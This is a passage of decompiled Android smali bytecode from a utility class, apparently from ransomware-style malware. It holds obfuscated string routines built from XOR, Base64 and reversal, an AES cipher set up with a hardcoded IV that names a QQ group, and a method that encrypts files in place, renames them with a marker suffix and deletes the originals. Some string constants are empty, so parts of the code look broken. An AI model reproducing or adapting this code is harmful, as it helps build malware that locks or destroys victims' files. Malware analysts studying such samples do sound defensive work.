    invoke-virtual { v1, v3, v2 }, Ljava/lang/String;->subSequence(II)Ljava/lang/CharSequence;
    move-result-object v1
    check-cast v1, Ljava/lang/String;
    new-instance v2, Ljava/lang/String;
    new-instance v3, Ljava/lang/StringBuilder;
    invoke-direct { v3 }, Ljava/lang/StringBuilder;-><init>()V
    new-instance v4, Ljava/lang/StringBuffer;
    new-instance v5, Ljava/lang/String;
    invoke-virtual { p0 }, Ljava/lang/String;->getBytes()[B
    move-result-object v6
    invoke-static { v6, v7 }, Landroid/util/Base64;->encode([BI)[B
    move-result-object v6
    invoke-direct { v5, v6 }, Ljava/lang/String;-><init>([B)V
    invoke-direct { v4, v5 }, Ljava/lang/StringBuffer;-><init>(Ljava/lang/String;)V
    invoke-virtual { v4 }, Ljava/lang/StringBuffer;->reverse()Ljava/lang/StringBuffer;
    move-result-object v4
    invoke-static { v4 }, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
    move-result-object v4
    invoke-virtual { v3, v4 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v3
    const-string v4, ""
    invoke-virtual { v3, v4 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v3
    invoke-virtual { v3 }, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v3
    invoke-virtual { v3 }, Ljava/lang/String;->getBytes()[B
    move-result-object v3
    invoke-static { v3, v7 }, Landroid/util/Base64;->encode([BI)[B
    move-result-object v3
    invoke-direct { v2, v3 }, Ljava/lang/String;-><init>([B)V
    const-string v3, "\u4e09\u751f\u77f3\u7554"
    invoke-virtual { v2, v0, v3 }, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    move-result-object v2
    const-string v3, "\u5f7c\u5cb8\u82b1\u5f00"
    invoke-virtual { v2, v1, v3 }, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    move-result-object v2
    const-string v3, "\u4e09\u751f\u77f3\u7554"
    invoke-virtual { v2, v3, v1 }, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    move-result-object v1
    const-string v2, "\u5f7c\u5cb8\u82b1\u5f00"
    invoke-virtual { v1, v2, v0 }, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    move-result-object v0
    return-object v0
.end method

.method public static getmm(Ljava/lang/String;)Ljava/lang/String;
  .catch Ljava/security/NoSuchAlgorithmException; { :L0 .. :L1 } :L3
  .registers 4
    const/4 v0, 0
    check-cast v0, [B
  :L0
    const-string v1, "SHA-1"
    invoke-static { v1 }, Ljava/security/MessageDigest;->getInstance(Ljava/lang/String;)Ljava/security/MessageDigest;
    move-result-object v1
    invoke-virtual { p0 }, Ljava/lang/String;->getBytes()[B
    move-result-object v2
    invoke-virtual { v1, v2 }, Ljava/security/MessageDigest;->update([B)V
    invoke-virtual { v1 }, Ljava/security/MessageDigest;->digest()[B
  :L1
    move-result-object v0
  :L2
    invoke-static { v0 }, Lcsc/stuff/Utils;->byte2hex([B)Ljava/lang/String;
    move-result-object v0
    return-object v0
  :L3
    move-exception v1
    invoke-virtual { v1 }, Ljava/security/NoSuchAlgorithmException;->printStackTrace()V
    goto :L2
.end method

.method public static initAESCipher(I)Ljavax/crypto/Cipher;
  .catch Ljava/security/NoSuchAlgorithmException; { :L0 .. :L1 } :L2
  .catch Ljavax/crypto/NoSuchPaddingException; { :L0 .. :L1 } :L3
  .catch Ljava/security/InvalidKeyException; { :L0 .. :L1 } :L4
  .catch Ljava/security/InvalidAlgorithmParameterException; { :L0 .. :L1 } :L5
  .registers 6
    const/4 v0, 0
    check-cast v0, Ljavax/crypto/Cipher;
  :L0
    new-instance v1, Ljavax/crypto/spec/IvParameterSpec;
    const-string v2, "QQqun 571012706 "
    invoke-virtual { v2 }, Ljava/lang/String;->getBytes()[B
    move-result-object v2
    invoke-direct { v1, v2 }, Ljavax/crypto/spec/IvParameterSpec;-><init>([B)V
    invoke-static { }, Lcsc/stuff/Utils;->generateCipher()Ljava/lang/String;
    move-result-object v2
    const-string v3, "Cryptor"
    const-string v4, "Key generated"
    invoke-static { v3, v4 }, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I
    new-instance v3, Ljavax/crypto/spec/SecretKeySpec;
    invoke-virtual { v2 }, Ljava/lang/String;->getBytes()[B
    move-result-object v2
    const-string v4, "AES"
    invoke-direct { v3, v2, v4 }, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V
    const-string v2, "AES/CBC/PKCS5Padding"
    invoke-static { v2 }, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;
    move-result-object v0
    invoke-virtual { v0, p0, v3, v1 }, Ljavax/crypto/Cipher;->init(ILjava/security/Key;Ljava/security/spec/AlgorithmParameterSpec;)V
  :L1
    return-object v0
  :L2
    move-exception v1
    invoke-virtual { v1 }, Ljava/security/NoSuchAlgorithmException;->printStackTrace()V
    goto :L1
  :L3
    move-exception v1
    invoke-virtual { v1 }, Ljavax/crypto/NoSuchPaddingException;->printStackTrace()V
    goto :L1
  :L4
    move-exception v1
    invoke-virtual { v1 }, Ljava/security/InvalidKeyException;->printStackTrace()V
    goto :L1
  :L5
    move-exception v1
    invoke-virtual { v1 }, Ljava/security/InvalidAlgorithmParameterException;->printStackTrace()V
    goto :L1
.end method

.method static jd(Ljava/lang/String;)I
  .registers 5
    const-string v0, ""
    invoke-virtual { v0 }, Ljava/lang/String;->length()I
    move-result v0
    const-string v1, ""
    const-string v2, "/"
    const-string v3, ""
    invoke-virtual { v1, v2, v3 }, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    move-result-object v1
    invoke-virtual { v1 }, Ljava/lang/String;->length()I
    move-result v1
    sub-int/2addr v0, v1
    return v0
.end method

.method public static jj(Ljava/io/File;Ljava/lang/String;I)V
  .registers 8
    invoke-static { }, Lcsc/stuff/Utils;->generateCipher()Ljava/lang/String;
    move-result-object v1
    if-nez p2, :L1
    invoke-virtual { p0 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v0
    invoke-virtual { p0 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v2
    const/4 v3, 0
    invoke-virtual { v0 }, Ljava/lang/String;->length()I
    move-result v4
    invoke-virtual { v0, v3, v4 }, Ljava/lang/String;->subSequence(II)Ljava/lang/CharSequence;
    move-result-object v0
    check-cast v0, Ljava/lang/String;
    invoke-static { v1, v2, v0 }, Lcsc/stuff/Utils;->decryptFile(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/io/File;
  :L0
    invoke-virtual { p0 }, Ljava/io/File;->delete()Z
    return-void
  :L1
    invoke-virtual { p0 }, Ljava/io/File;->toString()Ljava/lang/String;
    move-result-object v0
    new-instance v2, Ljava/lang/StringBuilder;
    invoke-direct { v2 }, Ljava/lang/StringBuilder;-><init>()V
    invoke-static { p0 }, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
    move-result-object v3
    invoke-virtual { v2, v3 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v2
    const-string v3, "!\uff01"
    invoke-virtual { v2, v3 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v2
    invoke-virtual { v2 }, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v2
    invoke-static { v1, v0, v2 }, Lcsc/stuff/Utils;->encryptFile(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/io/File;
    new-instance v0, Ljava/io/File;
    new-instance v1, Ljava/lang/StringBuilder;
    invoke-direct { v1 }, Ljava/lang/StringBuilder;-><init>()V
    invoke-static { p0 }, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
    move-result-object v2
    invoke-virtual { v1, v2 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v1
    const-string v2, "!\uff01"
    invoke-virtual { v1, v2 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v1
    invoke-virtual { v1 }, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v1
    invoke-direct { v0, v1 }, Ljava/io/File;-><init>(Ljava/lang/String;)V
    new-instance v1, Ljava/io/File;
    new-instance v2, Ljava/lang/StringBuilder;
    invoke-direct { v2 }, Ljava/lang/StringBuilder;-><init>()V
    invoke-static { p0 }, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
    move-result-object v3
    invoke-virtual { v2, v3 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v2
    const-string v3, ""
    invoke-virtual { v2, v3 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v2
    invoke-virtual { v2 }, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v2
    invoke-direct { v1, v2 }, Ljava/io/File;-><init>(Ljava/lang/String;)V
    invoke-virtual { v0, v1 }, Ljava/io/File;->renameTo(Ljava/io/File;)Z
    goto :L0
.end method

.method public static l(Ljava/lang/String;)Ljava/lang/String;
  .registers 8
    const/4 v1, 0
    const-string v0, "\u4e09\u751f\u77f3\u7554 \u5f7c\u5cb8\u82b1\u5f00"
    invoke-virtual { v0 }, Ljava/lang/String;->getBytes()[B
    move-result-object v0
    invoke-static { v0, v1 }, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;
    move-result-object v0
    const-string v2, "\\D+"
    const-string v3, ""
    invoke-virtual { v0, v2, v3 }, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    move-result-object v2
    new-instance v0, Ljava/lang/StringBuffer;
    invoke-direct { v0, v2 }, Ljava/lang/StringBuffer;-><init>(Ljava/lang/String;)V
    invoke-virtual { v0 }, Ljava/lang/StringBuffer;->reverse()Ljava/lang/StringBuffer;
    move-result-object v0
    invoke-virtual { v0 }, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
    move-result-object v0
    invoke-static { v0 }, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;
    move-result-object v3
    invoke-virtual { p0 }, Ljava/lang/String;->toCharArray()[C
    move-result-object v4
    move v0, v1
  :L0
    array-length v5, v4
    if-ge v0, v5, :L1
    invoke-virtual { v3 }, Ljava/lang/Integer;->intValue()I
    move-result v5
    aget-char v6, v4, v0
    xor-int/2addr v5, v6
    int-to-char v5, v5
    int-to-char v5, v5
    aput-char v5, v4, v0
    add-int/lit8 v0, v0, 1
    goto :L0
  :L1
    new-instance v0, Ljava/lang/StringBuffer;
    new-instance v3, Ljava/lang/String;
    new-instance v5, Ljava/lang/String;
    invoke-direct { v5, v4 }, Ljava/lang/String;-><init>([C)V
    invoke-static { v5, v1 }, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B
    move-result-object v4
    invoke-direct { v3, v4 }, Ljava/lang/String;-><init>([B)V
    invoke-direct { v0, v3 }, Ljava/lang/StringBuffer;-><init>(Ljava/lang/String;)V
    invoke-virtual { v0 }, Ljava/lang/StringBuffer;->reverse()Ljava/lang/StringBuffer;
    move-result-object v0
    invoke-virtual { v0 }, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
    move-result-object v0
    invoke-static { v2 }, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;
    move-result-object v2
    invoke-virtual { v0 }, Ljava/lang/String;->toCharArray()[C
    move-result-object v0
  :L2
    array-length v3, v0
    if-ge v1, v3, :L3
    invoke-virtual { v2 }, Ljava/lang/Integer;->intValue()I
    move-result v3
    aget-char v4, v0, v1
    xor-int/2addr v3, v4
    int-to-char v3, v3
    int-to-char v3, v3
    aput-char v3, v0, v1
    add-int/lit8 v1, v1, 1
    goto :L2
  :L3
    new-instance v1, Ljava/lang/String;
    invoke-direct { v1, v0 }, Ljava/lang/String;-><init>([C)V
    return-object v1
.end method

.method private static to2Str(J)Ljava/lang/String;
  .registers 4
    const-wide/16 v0, 9
    cmp-long v0, p0, v0
    if-lez v0, :L1
    new-instance v0, Ljava/lang/StringBuilder;
    invoke-direct { v0 }, Ljava/lang/StringBuilder;-><init>()V
    invoke-static { p0, p1 }, Ljava/lang/String;->valueOf(J)Ljava/lang/String;
    move-result-object v1
    invoke-virtual { v0, v1 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v0
    const-string v1, ""
    invoke-virtual { v0, v1 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v0
    invoke-virtual { v0 }, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v0
  :L0
    return-object v0
  :L1
    new-instance v0, Ljava/lang/StringBuilder;
    invoke-direct { v0 }, Ljava/lang/StringBuilder;-><init>()V
    const-string v1, "0"
    invoke-virtual { v0, v1 }, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v0
    invoke-virtual { v0, p0, p1 }, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;
    move-result-object v0
    invoke-virtual { v0 }, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v0
    goto :L0
.end method

.method static zjs(Ljava/lang/String;)I
  .registers 2
    invoke-virtual { p0 }, Ljava/lang/String;->getBytes()[B
    move-result-object v0
    array-length v0, v0
    return v0
.end method
